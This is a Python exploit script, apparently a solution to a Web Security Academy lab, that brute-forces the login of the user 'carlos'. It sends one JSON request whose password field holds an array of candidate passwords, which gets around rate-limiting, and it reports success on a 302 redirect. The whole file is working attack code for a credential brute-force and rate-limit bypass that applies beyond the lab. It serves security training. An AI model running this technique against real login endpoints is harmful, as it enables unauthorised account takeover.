import json
import sys
import requests
import urllib3

# Disable insecure request warnings (useful with Burp Suite proxy)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional proxy configuration for debugging
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <LAB_URL>")
        print(f"[+] Example: {sys.argv[0]} https://YOUR-LAB-ID.web-security-academy.net")
        sys.exit(1)

    lab_url = sys.argv[1].rstrip('/')
    login_endpoint = f"{lab_url}/login"

    password_file = "passwords.txt"
    print("[+] Loading passwords...")
    try:
        with open(password_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: Could not find {password_file}")
        sys.exit(1)

    print(f"[+] Loaded {len(passwords)} passwords.")
    print("[+] Sending payload with multiple credentials to bypass rate‑limiting...")

    # Construct JSON payload with username and an array of passwords
    data = {"username": "carlos", "password": passwords}
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    response = requests.post(login_endpoint, json=data, headers=headers, proxies=proxies, verify=False, allow_redirects=False)
    print(f"[+] Status Code Received: {response.status_code}")
    if response.status_code == 302:
        print("[+] SUCCESS! Carlos's password was brute‑forced via multi‑credential request.")
        print(f"[+] Redirect Location: {response.headers.get('Location')}")
    else:
        print("[-] Exploit payload did not return a 302 redirect. Check structure or password list.")

if __name__ == "__main__":
    main()
